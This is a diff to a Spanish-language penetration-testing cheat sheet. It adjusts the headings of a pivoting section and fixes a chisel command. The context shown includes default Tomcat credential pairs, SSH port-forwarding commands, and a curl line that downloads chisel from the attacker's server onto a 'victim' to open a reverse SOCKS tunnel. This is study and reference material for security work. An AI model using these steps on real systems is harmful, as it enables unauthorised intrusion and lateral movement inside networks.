@@ -410,15 +410,15 @@ tomcat:s3cr3t
 admin:tomcat
 ```
 ### Pivoting
-### Local 
+#### Local 
 ```shell
 - ssh -L <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
 ```
-### Remoto
+#### Remoto
 ```shell
 - ssh -R <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
 ```
-### Dinámico 
+#### Dinámico 
 ```shell
 - ssh -D <puerto local que actuará como proxy> <usuario>@<ip> 
 ```
@@ -433,7 +433,7 @@ admin:tomcat
 ```shell
 - curl http://<ip>/chisel_linux_amd64 -o chisel <--- para descargar chisel en la victima con el servidor del atacante.
 - chmod +x chisel
-- ./chisel client <ip>:<ip> R:socks 
+- ./chisel client <ip>:<puerto> R:socks 
 ```
 <div align="left">
   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="39" alt="linux logo"  />
